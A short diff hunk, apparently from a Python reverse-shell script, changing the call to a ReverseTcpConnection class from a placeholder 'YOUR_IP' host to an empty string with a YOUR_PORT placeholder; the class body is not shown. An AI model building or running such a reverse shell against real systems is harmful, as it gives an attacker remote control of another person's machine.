@@ -45,6 +45,6 @@ class ReverseTcpConnection(object):
 
 
 # _Class call
-start = ReverseTcpConnection("YOUR_IP", YOUR_PORT)
+start = ReverseTcpConnection("", YOUR_PORT)
 start()
 
